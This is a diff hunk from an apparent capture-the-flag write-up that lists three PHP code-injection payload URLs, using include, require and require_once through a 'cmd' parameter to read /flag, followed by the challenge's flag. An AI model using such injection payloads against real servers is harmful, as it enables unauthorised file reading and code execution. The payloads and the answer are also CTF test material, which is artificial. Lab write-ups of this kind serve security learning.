@@ -22,7 +22,9 @@ if(isset($cmd)){
 payload :
 
 `http://18.192.38.21:3333/?cmd=include$_GET[0]?>&0=/flag`
+
 `http://18.192.38.21:3333/?cmd=require$_GET[0]?>&0=/flag`
+
 `http://18.192.38.21:3333/?cmd=require_once$_GET[0]?>&0=/flag`
 
 __FLAG{EZZ_PHP_C0DE_BYP@SS}__
